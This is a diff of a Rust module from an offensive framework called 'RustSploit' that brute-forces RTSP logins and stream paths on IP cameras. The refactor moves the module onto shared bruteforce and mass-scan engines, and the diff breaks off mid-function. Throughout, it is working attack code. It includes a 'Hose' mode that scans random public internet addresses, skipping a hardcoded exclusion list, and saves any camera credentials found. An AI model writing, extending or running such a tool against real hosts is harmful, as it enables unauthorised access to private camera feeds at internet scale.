@@ -1,108 +1,219 @@
-use anyhow::{anyhow, Result, Context};
+use anyhow::{anyhow, Result};
 use base64::engine::general_purpose::STANDARD as Base64;
 use base64::Engine as _;
 use colored::*;
-use futures::stream::{FuturesUnordered, StreamExt};
 use std::{
-    fs::File,
-    io::Write,
     net::{IpAddr, SocketAddr},
     sync::Arc,
-    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
     time::Duration,
 };
 use tokio::{
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
-    sync::{Mutex, Semaphore},
-    time::{sleep, timeout},
-    fs::OpenOptions,
+    time::timeout,
 };
 
+use crate::modules::creds::utils::{
+    generate_combos, is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
+    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
+};
 use crate::utils::{
-    load_lines, get_filename_in_current_dir, normalize_target,
-    cfg_prompt_yes_no, cfg_prompt_default, cfg_prompt_int_range, cfg_prompt_port,
-    cfg_prompt_existing_file,
-    cfg_prompt_output_file,
+    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
+    cfg_prompt_port, cfg_prompt_yes_no, load_lines, normalize_target,
 };
-use crate::modules::creds::utils::{BruteforceStats, is_subnet_target, parse_subnet, subnet_host_count, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};
 
-const PROGRESS_INTERVAL_SECS: u64 = 2;
-const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
-const STATE_FILE: &str = "rtsp_hose_state.log";
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "RTSP Brute Force".to_string(),
+        description: "Brute-force RTSP authentication for IP cameras and streaming devices. Supports advanced RTSP commands, custom headers, path brute-forcing, and subnet/mass scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+    }
+}
 
-// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc) - Copied from telnet_hose
-const EXCLUDED_RANGES: &[&str] = &[
-    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", // Private
-    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", // Multicast/Reserved
-    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", // Carrier/LinkLocal/Broadcast
-    // Cloudflare
-    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
-    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
-    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
-    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
-    "1.1.1.1/32", "1.0.0.1/32",
-    // Google
-    "8.8.8.8/32", "8.8.4.4/32"
-];
+const CONNECT_TIMEOUT_MS: u64 = 3000;
 
 fn display_banner() {
-    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
-    println!("{}", "║   Advanced RTSP Brute Force Module                        ║".cyan());
-    println!("{}", "║   IP Camera and Streaming Server Credential Testing       ║".cyan());
-    println!("{}", "║   Supports path enumeration and custom headers            ║".cyan());
-    println!("{}", "║   Modes: Single Target & Mass Scan (Hose)                 ║".cyan());
-    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
-    println!();
+    crate::mprintln!(
+        "{}",
+        "╔═══════════════════════════════════════════════════════════╗".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   Advanced RTSP Brute Force Module                        ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   IP Camera and Streaming Server Credential Testing       ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   Supports path enumeration and custom headers            ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   Modes: Single Target & Mass Scan (Hose)                 ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "╚═══════════════════════════════════════════════════════════╝".cyan()
+    );
+    crate::mprintln!();
 }
 
 /// Main entry point for the advanced RTSP brute force module.
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
-    
-    // Check for Mass Scan Mode conditions
-    // If target is "random", "0.0.0.0", "0.0.0.0/0", or looks like a file path (and we can assume it's a file list)
-    // Note: The caller usually handles file loading for specific modules, but for "hose" modules like telnet_hose, passing the file path is common.
-    // We'll treat it as mass scan if it's explicitly "random" OR "0.0.0.0" OR if it points to an existing file.
-    // Simple heuristic: if we can open it as a file, treat as file list for mass scan.
-    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
 
-    println!("{}", format!("[*] Target: {}", target).cyan());
-    if is_mass_scan {
-        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
-        return run_mass_scan(target).await;
+    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
+
+    // --- Mass Scan Mode ---
+    if is_mass_scan_target(target) {
+        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());
+
+        let usernames_file =
+            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file =
+            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let paths_file =
+            cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)").await?;
+        let users = Arc::new(load_lines(&usernames_file)?);
+        let passes = Arc::new(load_lines(&passwords_file)?);
+        let mut paths = load_lines(&paths_file)?;
+        if paths.is_empty() {
+            paths.push("".to_string());
+        }
+        let paths = Arc::new(paths);
+        if users.is_empty() || passes.is_empty() {
+            return Err(anyhow!("Wordlists cannot be empty"));
+        }
+
+        let cfg = MassScanConfig {
+            protocol_name: "RTSP",
+            default_port: 554,
+            state_file: "rtsp_hose_state.log",
+            default_output: "rtsp_mass_results.txt",
+            default_concurrency: 500,
+        };
+
+        return run_mass_scan(target, cfg, move |ip: IpAddr, port: u16| {
+            let users = users.clone();
+            let passes = passes.clone();
+            let paths = paths.clone();
+            async move {
+                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(3)).await {
+                    return None;
+                }
+
+                let sa = SocketAddr::new(ip, port);
+                let empty_headers: Vec<String> = Vec::new();
+                for path in paths.iter() {
+                    for user in users.iter() {
+                        for pass in passes.iter() {
+                            let addrs = [sa];
+                            let res = try_rtsp_login(
+                                &addrs,
+                                &sa.to_string(),
+                                user,
+                                pass,
+                                path,
+                                Some("DESCRIBE"),
+                                &empty_headers,
+                            )
+                            .await;
+                            match res {
+                                Ok(true) => {
+                                    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
+                                    let line =
+                                        format!("[{}] {}:{}:{}:{}\n", now, ip, port, user, pass);
+                                    crate::mprintln!(
+                                        "\r{}",
+                                        format!(
+                                            "[+] FOUND: {}:{} -> {}:{} [path={}]",
+                                            ip, port, user, pass, path
+                                        )
+                                        .green()
+                                        .bold()
+                                    );
+                                    return Some(line);
+                                }
+                                Err(e) => {
+                                    let err_str = e.to_string().to_lowercase();
+                                    if err_str.contains("refused")
+                                        || err_str.contains("timeout")
+                                        || err_str.contains("reset")
+                                    {
+                                        return None;
+                                    }
+                                }
+                                _ => {}
+                            }
+                        }
+                    }
+                }
+                None
+            }
+        })
+        .await;
     }
 
+    // --- Subnet Scan Mode ---
     if is_subnet_target(target) {
-        println!("{}", "[*] Mode: Subnet Scan".cyan());
+        crate::mprintln!("{}", "[*] Mode: Subnet Scan".cyan());
         return run_subnet_scan(target).await;
     }
 
     // --- Standard Single-Target Logic ---
 
-    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554)?;
+    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554).await?;
 
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
 
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 10000)? as usize;
+    let concurrency =
+        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 10000).await? as usize;
 
-    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true)?;
-    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true)?;
+    let stop_on_success =
+        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
     let save_path = if save_results {
-        Some(cfg_prompt_output_file("output_file", "Output file", "rtsp_results.txt")?)
+        Some(cfg_prompt_output_file("output_file", "Output file", "rtsp_results.txt").await?)
     } else {
         None
     };
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false)?;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let combo_mode = cfg_prompt_yes_no(
+        "combo_mode",
+        "Combination mode? (try every pass with every user)",
+        false,
+    )
+    .await?;
 
-    let advanced_mode = cfg_prompt_yes_no("advanced_mode", "Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false)?;
+    let advanced_mode = cfg_prompt_yes_no(
+        "advanced_mode",
+        "Use advanced RTSP commands/headers (DESCRIBE + custom headers)?",
+        false,
+    )
+    .await?;
     let mut advanced_headers: Vec<String> = Vec::new();
     let advanced_command = if advanced_mode {
-        let method = cfg_prompt_default("rtsp_method", "RTSP method to use (e.g. DESCRIBE)", "DESCRIBE")?;
-        if cfg_prompt_yes_no("load_headers_file", "Load extra RTSP headers from a file?", false)? {
-            let headers_path = cfg_prompt_existing_file("headers_file", "Path to RTSP headers file")?;
+        let method = cfg_prompt_default(
+            "rtsp_method",
+            "RTSP method to use (e.g. DESCRIBE)",
+            "DESCRIBE",
+        )
+        .await?;
+        if cfg_prompt_yes_no(
+            "load_headers_file",
+            "Load extra RTSP headers from a file?",
+            false,
+        )
+        .await?
+        {
+            let headers_path =
+                cfg_prompt_existing_file("headers_file", "Path to RTSP headers file").await?;
             advanced_headers = load_lines(&headers_path)?;
         }
         Some(method)
@@ -113,60 +224,57 @@ pub async fn run(target: &str) -> Result<()> {
 
     // Extract RTSP path if present (e.g., rtsp://host:port/path -> path)
     let implicit_path = extract_rtsp_path(target);
-    
+
     // Normalize target and add port if needed
     let target_normalized = if target.starts_with("rtsp://") {
-        target.strip_prefix("rtsp://")
-            .unwrap()
+        target
+            .strip_prefix("rtsp://")
+            .unwrap_or(target)
             .split('/')
             .next()
             .unwrap_or(target)
     } else {
         target.split('/').next().unwrap_or(target)
     };
-    
+
     let normalized = normalize_target(target_normalized)?;
-    let addr = if normalized.contains(':') {
+    let target_host = if normalized.contains(':') {
+        // Already has port — extract host part
         normalized
+            .rsplit_once(':')
+            .map(|(h, _)| h)
+            .unwrap_or(&normalized)
+            .to_string()
     } else {
-        format!("{}:{}", normalized, port)
-    };
-    let found = Arc::new(Mutex::new(Vec::new()));
-    let stop = Arc::new(AtomicBool::new(false));
-    let stats = Arc::new(BruteforceStats::new()); // Standardized stats
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-
-    println!("\n[*] Starting brute-force on {}", addr);
-
-    let resolved_addrs = match resolve_targets(&addr).await {
-        Ok(addrs) => Arc::new(addrs),
-        Err(e) => {
-            eprintln!("[!] Failed to resolve '{}': {}", addr, e);
-            return Err(e);
-        }
+        normalized.clone()
     };
 
     let users = load_lines(&usernames_file)?;
     if users.is_empty() {
-        println!("[!] Username wordlist is empty. Exiting.");
+        crate::mprintln!("[!] Username wordlist is empty. Exiting.");
         return Ok(());
     }
 
     let pass_lines = load_lines(&passwords_file)?;
     if pass_lines.is_empty() {
-        println!("[!] Password wordlist is empty. Exiting.");
+        crate::mprintln!("[!] Password wordlist is empty. Exiting.");
         return Ok(());
     }
 
-    let brute_force_paths = cfg_prompt_yes_no("brute_force_paths", "Brute force possible RTSP paths (e.g. /stream /live)?", false)?;
+    let brute_force_paths = cfg_prompt_yes_no(
+        "brute_force_paths",
+        "Brute force possible RTSP paths (e.g. /stream /live)?",
+        false,
+    )
+    .await?;
     let mut paths = if brute_force_paths {
-        let paths_file = cfg_prompt_existing_file("paths_file", "Path to RTSP paths file")?;
+        let paths_file = cfg_prompt_existing_file("paths_file", "Path to RTSP paths file").await?;
         load_lines(&paths_file)?
     } else {
         vec!["".to_string()]
     };
     if paths.is_empty() {
-        println!("[!] RTSP paths list is empty. Falling back to default root path.");
+        crate::mprintln!("[!] RTSP paths list is empty. Falling back to default root path.");
         paths.push(String::new());
     }
     if let Some(p) = implicit_path {
@@ -174,134 +282,149 @@ pub async fn run(target: &str) -> Result<()> {
             paths.insert(0, p);
         }
     }
-    println!();
 
-    // Start progress reporter
-    let stats_clone = stats.clone();
-    let stop_clone = stop.clone();
-    let progress_handle = tokio::spawn(async move {
-        loop {
-            if stop_clone.load(Ordering::Relaxed) {
-                break;
-            }
-            stats_clone.print_progress();
-            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
+    let addr = format!("{}:{}", target_host, port);
+    let resolved_addrs = match resolve_targets(&addr).await {
+        Ok(addrs) => Arc::new(addrs),
+        Err(e) => {
+            crate::meprintln!("[!] Failed to resolve '{}': {}", addr, e);
+            return Err(e);
         }
-    });
+    };
 
-    let mut tasks = FuturesUnordered::new();
-    let mut idx = 0usize;
+    let combos = generate_combos(&users, &pass_lines, combo_mode);
+    crate::mprintln!(
+        "{}",
+        format!(
+            "[*] {} credential pair(s) x {} path(s) = {} total attempts",
+            combos.len(),
+            paths.len(),
+            combos.len() * paths.len()
+        )
+        .cyan()
+    );
 
-    for pass in pass_lines {
-        if stop_on_success && stop.load(Ordering::Relaxed) { break; }
+    // Loop over each RTSP path, running the bruteforce engine per path.
+    // This preserves the engine's clean (user, pass) API while covering
+    // the RTSP-specific path dimension.
+    let mut all_found: Vec<(String, String, String, String)> = Vec::new();
 
-        let userlist: Vec<String> = if combo_mode {
-            users.clone()
+    for path in &paths {
+        let path_display = if path.is_empty() {
+            "/ (root)"
         } else {
-            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
+            path.as_str()
+        };
+        crate::mprintln!("\n{}", format!("[*] Testing path: {}", path_display).cyan());
+
+        let path_c = path.clone();
+        let addrs_c = resolved_addrs.clone();
+        let headers_c = advanced_headers.clone();
+        let command_c = advanced_command.clone();
+
+        let try_login = move |t: String, p: u16, user: String, pass: String| {
+            let addrs = addrs_c.clone();
+            let path = path_c.clone();
+            let headers = headers_c.clone();
+            let command = command_c.clone();
+            let display_addr = format!("{}:{}", t, p);
+            async move {
+                match try_rtsp_login(
+                    addrs.as_slice(),
+                    &display_addr,
+                    &user,
+                    &pass,
+                    &path,
+                    command.as_deref(),
+                    &headers,
+                )
+                .await
+                {
+                    Ok(true) => LoginResult::Success,
+                    Ok(false) => LoginResult::AuthFailed,
+                    Err(e) => {
+                        let msg = e.to_string().to_lowercase();
+                        let retryable = !msg.contains("401") && !msg.contains("403");
+                        LoginResult::Error {
+                            message: e.to_string(),
+                            retryable,
+                        }
+                    }
+                }
+            }
         };
 
-        for user in userlist {
-            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
-            for path in &paths {
-                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
+        let result = run_bruteforce(
+            &BruteforceConfig {
+                target: target_host.clone(),
+                port,
+                concurrency,
+                stop_on_success,
+                verbose,
+                delay_ms: 10,
+                max_retries: 2,
+                service_name: "rtsp",
+                source_module: "creds/generic/rtsp_bruteforce",
+            },
+            combos.clone(),
+            try_login,
+        )
+        .await?;
 
-                let addr_clone = addr.clone();
-                let user_clone = user.clone();
-                let pass_clone = pass.clone();
-                let path_clone = path.clone();
-                let found_clone = Arc::clone(&found);
-                let stop_clone = Arc::clone(&stop);
-                let stats_clone = Arc::clone(&stats);
-                let command = advanced_command.clone();
-                let headers = Arc::clone(&advanced_headers);
-                let semaphore_clone = Arc::clone(&semaphore);
-                let addrs_clone = Arc::clone(&resolved_addrs);
-                let stop_flag = stop_on_success;
-                let verbose_flag = verbose;
-
-                tasks.push(tokio::spawn(async move {
-                    if stop_flag && stop_clone.load(Ordering::Relaxed) { return; }
-                    let permit = match semaphore_clone.acquire_owned().await {
-                        Ok(permit) => permit,
-                        Err(_) => return,
-                    };
-                    if stop_flag && stop_clone.load(Ordering::Relaxed) { 
-                        drop(permit);
-                        return; 
-                    }
-
-                    match try_rtsp_login(
-                        addrs_clone.as_slice(),
-                        &addr_clone,
-                        &user_clone,
-                        &pass_clone,
-                        &path_clone,
-                        command.as_deref(),
-                        &headers,
-                    ).await {
-                        Ok(true) => {
-                            let path_str = if path_clone.is_empty() { "NO_PATH" } else { &path_clone };
-                            println!("\r{}", format!("[+] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_str).green().bold());
-                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone(), path_str.to_string()));
-                            stats_clone.record_success();
-                            if stop_flag {
-                                stop_clone.store(true, Ordering::Relaxed);
-                            }
-                        }
-                        Ok(false) => {
-                            stats_clone.record_failure();
-                            if verbose_flag {
-                                println!("\r{}", format!("[-] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_clone).dimmed());
-                            }
-                        }
-                        Err(e) => {
-                            stats_clone.record_error(e.to_string()).await;
-                            if verbose_flag {
-                                println!("\r{}", format!("[!] {} -> error: {}", addr_clone, e).red());
-                            }
-                        }
-                    }
-
-                    drop(permit);
-                    sleep(Duration::from_millis(10)).await;
-                }));
-            }
+        let path_label = if path.is_empty() {
+            "NO_PATH".to_string()
+        } else {
+            path.clone()
+        };
+        for (host, user, pass) in &result.found {
+            all_found.push((host.clone(), user.clone(), pass.clone(), path_label.clone()));
         }
-        idx += 1;
-    }
 
-    while let Some(res) = tasks.next().await {
-        if let Err(e) = res {
-            if verbose {
-               stats.record_error(format!("Task panic: {}", e)).await;
-            }
+        // If stop_on_success and we found something on this path, skip remaining paths
+        if stop_on_success && !result.found.is_empty() {
+            crate::mprintln!(
+                "{}",
+                "[*] Credentials found and stop_on_success enabled — skipping remaining paths."
+                    .yellow()
+            );
+            break;
         }
     }
 
-    // Stop progress reporter
-    stop.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-
-    // Print final statistics
-    stats.print_final().await;
-
-    let creds = found.lock().await;
-    if creds.is_empty() {
-        println!("{}", "[-] No credentials found (with these paths).".yellow());
+    // Final summary across all paths
+    if all_found.is_empty() {
+        crate::mprintln!(
+            "{}",
+            "[-] No credentials found (with these paths).".yellow()
+        );
     } else {
-        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
-        for (host, user, pass, path) in creds.iter() {
-            println!("    {} -> {}:{} [path={}]", host, user, pass, path);
+        crate::mprintln!(
+            "\n{}",
+            format!(
+                "[+] Found {} valid credential(s) across all paths:",
+                all_found.len()
+            )
+            .green()
+            .bold()
+        );
+        for (host, user, pass, path) in &all_found {
+            crate::mprintln!("    {} -> {}:{} [path={}]", host, user, pass, path);
         }
 
-        if let Some(path) = save_path {
-            let filename = get_filename_in_current_dir(&path);
-            if let Ok(mut file) = File::create(&filename) {
-                for (host, user, pass, path) in creds.iter() {
-                    let _ = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path);
+        if let Some(ref path) = save_path {
+            let filename = crate::utils::get_filename_in_current_dir(path);
+            {
+                use std::io::Write;
+                use std::os::unix::fs::OpenOptionsExt;
+                let mut opts = std::fs::OpenOptions::new();
+                opts.write(true).create(true).truncate(true);
+                opts.mode(0o600);
+                if let Ok(mut file) = opts.open(&filename) {
+                    for (host, user, pass, path) in &all_found {
+                        let _ = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path);
+                    }
+                    crate::mprintln!("[+] Results saved to '{}'", filename.display());
                 }
-                println!("[+] Results saved to '{}'", filename.display());
             }
         }
     }
@@ -309,274 +432,99 @@ pub async fn run(target: &str) -> Result<()> {
     Ok(())
 }
 
-/// Run subnet scan - iterate over all IPs in a CIDR range
+/// Run subnet scan using the generic subnet bruteforce engine.
+/// Loops over RTSP paths externally, running `run_subnet_bruteforce` per path.
 async fn run_subnet_scan(target: &str) -> Result<()> {
-    let network = parse_subnet(target)?;
-    let count = subnet_host_count(&network);
-    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
-
-    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554)?;
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    let paths_file = cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)")?;
-    let users = load_lines(&usernames_file)?;
-    let pass_lines = load_lines(&passwords_file)?;
-    let mut paths = load_lines(&paths_file)?;
-    if paths.is_empty() { paths.push("".to_string()); }
-    if users.is_empty() || pass_lines.is_empty() { return Err(anyhow!("Wordlists cannot be empty")); }
-
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "rtsp_subnet_results.txt")?;
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-    let creds_pkg = Arc::new((users, pass_lines, paths));
-    let total = count;
-
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(Duration::from_secs(5)).await;
-            println!("[*] Status: {}/{} IPs scanned, {} RTSP streams found",
-                s_checked.load(Ordering::Relaxed), total,
-                s_found.load(Ordering::Relaxed).to_string().green().bold());
-        }
-    });
-
-    for ip in network.iter() {
-        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
-        let cp = creds_pkg.clone();
-        let sc = stats_checked.clone();
-        let sf = stats_found.clone();
-        let of = output_file.clone();
-
-        tokio::spawn(async move {
-            mass_scan_host(ip, port, cp, sf, of, verbose).await;
-            sc.fetch_add(1, Ordering::Relaxed);
-            drop(permit);
-        });
-    }
-
-    for _ in 0..concurrency {
-        let _ = semaphore.acquire().await.context("Semaphore")?;
-    }
-
-    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} RTSP streams found.",
-        stats_checked.load(Ordering::Relaxed),
-        stats_found.load(Ordering::Relaxed)).cyan().bold());
-    Ok(())
-}
-
-/// Run mass scan logic (Hose style)
-async fn run_mass_scan(target: &str) -> Result<()> {
-    // Prep wordlists
-    println!("{}", "[*] Preparing Mass Scan configuration...".blue());
-    
-    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554)?;
-    
-    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
-    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
-    let paths_file = cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)")?;
-    
+    let port: u16 = cfg_prompt_port("port", "RTSP Port", 554).await?;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+    let paths_file =
+        cfg_prompt_existing_file("paths_file", "RTSP paths file (empty for none/root)").await?;
     let users = load_lines(&usernames_file)?;
     let pass_lines = load_lines(&passwords_file)?;
     let mut paths = load_lines(&paths_file)?;
     if paths.is_empty() {
-         paths.push("".to_string());
+        paths.push("".to_string());
     }
-
     if users.is_empty() || pass_lines.is_empty() {
         return Err(anyhow!("Wordlists cannot be empty"));
     }
 
-    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
-    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let concurrency =
+        cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let output_file = cfg_prompt_output_file(
+        "output_file",
+        "Output result file",
+        "rtsp_subnet_results.txt",
+    )
+    .await?;
 
-    let output_file = cfg_prompt_output_file("output_file", "Output result file", "rtsp_mass_results.txt")?;
+    for path in &paths {
+        let path_display = if path.is_empty() {
+            "/ (root)"
+        } else {
+            path.as_str()
+        };
+        crate::mprintln!(
+            "{}",
+            format!("[*] Subnet scan — RTSP path: {}", path_display).cyan()
+        );
 
-    // Parse exclusions
-    let exclusion_subnets = parse_exclusions(EXCLUDED_RANGES);
-    let exclusions = Arc::new(exclusion_subnets);
+        let path_c = path.clone();
+        let empty_headers: Arc<Vec<String>> = Arc::new(Vec::new());
 
-    // Shared State
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let stats_checked = Arc::new(AtomicUsize::new(0));
-    let stats_found = Arc::new(AtomicUsize::new(0));
-    
-    let creds_pkg = Arc::new((users, pass_lines, paths));
-
-    // Stats Reporter
-    let s_checked = stats_checked.clone();
-    let s_found = stats_found.clone();
-    tokio::spawn(async move {
-        loop {
-            tokio::time::sleep(Duration::from_secs(5)).await;
-            println!(
-                "[*] Status: {} IPs scanned, {} RTSP streams found",
-                s_checked.load(Ordering::Relaxed),
-                s_found.load(Ordering::Relaxed).to_string().green().bold()
-            );
-        }
-    });
-
-    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
-
-    if run_random {
-        println!("{}", "[*] Starting Random Internet Scan...".green());
-        loop {
-             let permit = semaphore.clone().acquire_owned().await.unwrap();
-             let exc = exclusions.clone();
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             tokio::spawn(async move {
-                 let ip = generate_random_public_ip(&exc);
-                 
-                 // Deduplication check
-                 if !is_ip_checked(&ip, STATE_FILE).await {
-                     mark_ip_checked(&ip, STATE_FILE).await;
-                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
-                 }
-                 
-                 sc.fetch_add(1, Ordering::Relaxed);
-                 drop(permit);
-             });
-        }
-    } else {
-        // File Mode
-        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
-        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
-        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
-
-        for ip_str in lines {
-             let permit = semaphore.clone().acquire_owned().await.unwrap();
-             let cp = creds_pkg.clone();
-             let sc = stats_checked.clone();
-             let sf = stats_found.clone();
-             let of = output_file.clone();
-             
-             // Try parse IP, or resolve? For mass scan usually IP lists. We'll try resolve if parsing fails.
-             // But to keep it simple and aligned with "hose" logic which normally takes IPs:
-             let ip_addr = match ip_str.parse::<IpAddr>() {
-                 Ok(ip) => Some(ip),
-                 Err(_) => {
-                     // Try resolve
-                     match tokio::net::lookup_host(format!("{}:{}", ip_str, port)).await {
-                         Ok(mut iter) => iter.next().map(|s| s.ip()),
-                         Err(_) => None
-                     }
-                 }
-             };
-
-             tokio::spawn(async move {
-                 if let Some(ip) = ip_addr {
-                    if !is_ip_checked(&ip, STATE_FILE).await {
-                        mark_ip_checked(&ip, STATE_FILE).await;
-                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
+        run_subnet_bruteforce(
+            target,
+            port,
+            users.clone(),
+            pass_lines.clone(),
+            &SubnetScanConfig {
+                concurrency,
+                verbose,
+                output_file: output_file.clone(),
+                service_name: "rtsp",
+                source_module: "creds/generic/rtsp_bruteforce",
+                skip_tcp_check: false,
+            },
+            move |ip: IpAddr, port: u16, user: String, pass: String| {
+                let path = path_c.clone();
+                let headers = empty_headers.clone();
+                async move {
+                    let sa = SocketAddr::new(ip, port);
+                    let addrs = [sa];
+                    match try_rtsp_login(
+                        &addrs,
+                        &sa.to_string(),
+                        &user,
+                        &pass,
+                        &path,
+                        Some("DESCRIBE"),
+                        &headers,
+                    )
+                    .await
+                    {
+                        Ok(true) => LoginResult::Success,
+                        Ok(false) => LoginResult::AuthFailed,
+                        Err(e) => {
+                            let msg = e.to_string().to_lowercase();
+                            let retryable = !msg.contains("refused")
+                                && !msg.contains("timeout")
+                                && !msg.contains("reset");
+                            LoginResult::Error {
+                                message: e.to_string(),
+                                retryable,
+                            }
+                        }
                     }
-                 }
-                 sc.fetch_add(1, Ordering::Relaxed);
-                 drop(permit);
-             });
-        }
-        
-        // Wait for finish
-        for _ in 0..concurrency {
-            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
-        }
+                }
+            },
+        )
+        .await?;
     }
 
     Ok(())
 }
-
-async fn mass_scan_host(
-    ip: IpAddr, 
-    port: u16, 
-    creds: Arc<(Vec<String>, Vec<String>, Vec<String>)>, 
-    stats_found: Arc<AtomicUsize>,
-    output_file: String,
-    verbose: bool
-) {
-    let sa = SocketAddr::new(ip, port);
-    
-    // 1. Connection Check (Fast Fail)
-    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
-        return;
-    }
-    
-    // 2. Bruteforce
-    let (users, passes, paths) = &*creds;
-    
-    // Helper to cleanup repetitive calls
-    // We iterate: Path -> User -> Pass ? Or User -> Pass -> Path?
-    // RTSP paths are important. Often root works.
-    
-    for path in paths {
-        for user in users {
-            for pass in passes {
-                // We use the existing try_rtsp_login. 
-                // It does re-connect, which is not optimal but robust.
-                let addrs = [sa];
